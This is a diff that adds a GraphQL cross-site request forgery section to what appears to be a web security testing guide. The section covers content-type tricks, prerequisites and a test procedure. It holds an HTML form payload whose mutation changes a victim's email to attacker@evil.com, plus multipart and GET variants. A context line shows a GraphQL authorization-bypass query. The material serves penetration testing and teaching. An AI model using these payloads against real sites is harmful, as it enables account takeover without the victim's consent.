@@ -156,6 +156,30 @@ GraphQL-specific authorization issues:
    - {search(query:"test"){...on AdminUser{adminPanel}}}
 ```
 
+### GraphQL CSRF — Content-Type Tricks
+
+GraphQL CSRF works when the endpoint uses **cookie-based auth** (not Bearer tokens) and accepts browser-simple content types. The GraphQL-over-HTTP spec says GET `MUST NOT` execute mutations, so form-encoded POST is the primary attack vector:
+
+```
+1. URL-encoded POST (primary — bypasses JSON content-type CORS preflight):
+   <form method="POST" action="https://target.com/graphql">
+     <input name="query" value='mutation{changeEmail(email:"attacker@evil.com")}'>
+   </form>
+   Content-Type: application/x-www-form-urlencoded is browser-simple → no preflight
+
+2. Multipart form (file upload endpoints often accept GraphQL):
+   Content-Type: multipart/form-data → also browser-simple, no preflight
+   Include query in form field
+
+3. GET mutations (non-standard, some legacy servers accept):
+   Only works if server violates spec by executing mutations via GET
+   AND SameSite=Lax allows the request (top-level navigation only, not <img>)
+```
+
+**Prerequisites for CSRF:** (1) cookie-based session auth (not Authorization header), (2) no custom header requirement (like `X-Requested-With`), (3) SameSite cookie attribute allows cross-origin (None or Lax for top-level nav), (4) no Origin/Referer validation. All four must be true.
+
+**Test procedure:** Identify a state-changing mutation. Submit it from a cross-origin HTML page using form-encoded POST. If the mutation executes in the victim's session, it's a finding. Bearer-token APIs are not vulnerable to classic CSRF.
+
 ---
 
 ## WebSocket Patterns
